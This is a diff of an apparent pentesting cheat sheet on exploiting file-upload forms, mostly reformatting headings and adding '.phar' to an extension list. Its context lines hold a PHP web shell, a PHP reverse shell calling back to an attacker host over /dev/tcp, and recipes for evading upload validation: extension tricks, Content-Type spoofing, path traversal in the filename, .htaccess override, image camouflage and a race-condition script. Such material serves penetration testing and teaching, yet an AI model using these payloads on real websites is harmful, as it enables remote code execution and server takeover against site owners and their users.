@@ -8,7 +8,7 @@ render_with_liquid: false
 
 ## Prepare a Payload
 
-1. **Create a Web Shell**
+- **Web Shell**
 
     For example, the file name is "exploit.php".
 
@@ -30,7 +30,7 @@ render_with_liquid: false
     <?php echo system($_GET['cmd']); ?>
     ```
 
-2. **Create a Reverse Shell**
+- **Reverse Shell**
 
     ```php
     <?php shell_exec("/bin/bash -c 'bash -i >& /dev/tcp/<attacker-ip>/4444 0>&1'"); ?>
@@ -54,7 +54,7 @@ render_with_liquid: false
 
     After uploading it, reload the page in which the payload uploaded e.g. "/upload/shell.php".
 
-3. **Create a Polyglot using Exiftool**
+- **Polyglot using Exiftool**
 
     It's assumed that you have an arbitrary image file.
 
@@ -66,14 +66,14 @@ render_with_liquid: false
 
 <br />
 
-## Bypass the File Validation Techniques when Uploading the Payload
+## Bypass Techniques
 
-Upload the payload in somewhere e.g. the profile picture's upload form.  
+Upload the exploit files in the target website e.g. the profile picture's upload form.  
 In most cases, you need to bypass the file validation.
 
-1. **Bypass the File Extension Validation**
+- **File Extensions**
 
-    If you cannot upload the payload with ".php", modify the extension.
+    If you cannot upload the payload with ".php", modify the extension and try it.
 
     ```
     exploit.php
@@ -81,6 +81,8 @@ In most cases, you need to bypass the file validation.
     exploit.php4
     exploit.php5
     exploit.phtml
+    exploit.phar
+
     exploit.php.
     exploit.php.jpg
     exploit.php.png
@@ -94,7 +96,7 @@ In most cases, you need to bypass the file validation.
     exploit.png.php
     ```
 
-2. **Bypass Content-Type Validation**
+- **Content-Types**
 
     If you cannot upload with "Content-Type: application/x-php", try changing it to **"Content-Type: image/jpeg"**.
 
@@ -111,7 +113,7 @@ In most cases, you need to bypass the file validation.
     ------abcdefghijk
     ```
 
-3. **Change the File Name to Directory Traversal**
+- **Path Traversal with the File Name**
 
     You may be able to edit the upload location by changing the **"filename"**.
 
@@ -128,7 +130,7 @@ In most cases, you need to bypass the file validation.
     ------abcdefghijk
     ```
 
-4. **Override the Server Configuration**
+- **Server Configurations**
 
     You may be able to override the ".htaccess".
 
@@ -145,7 +147,7 @@ In most cases, you need to bypass the file validation.
     ------abcdefghijk
     ```
 
-5. **Camouflage the Exploit as Image File**
+- **Camouflage as Image Files**
 
     You may be able to bypass exif_imagetype() of PHP by editing the contents in the payload as image file.
 
@@ -156,7 +158,7 @@ In most cases, you need to bypass the file validation.
     <?php echo system($_GET['cmd']); ?>
     ```
 
-6. **Bypass the Filter (Client-Side & Server-Side)**
+- **Bypass the Filter (Client-Side & Server-Side)**
 
     If the target website uses filter JavaScript around file uploading, you may be able to bypass it by using Burp Suite.
 
@@ -178,7 +180,7 @@ In most cases, you need to bypass the file validation.
     3. If you found the filtering file (.js), drop it.
     ```
 
-7. **Race Conditions using Turbo Intruder**
+- **Race Conditions using Turbo Intruder**
 
     ```python
     def queueRequests(target, wordlists):
@@ -228,7 +230,7 @@ In most cases, you need to bypass the file validation.
 
 ## Other Tips
 
-1. **Magic Numbers**
+- **Magic Numbers**
 
     ```sh
     # PNG
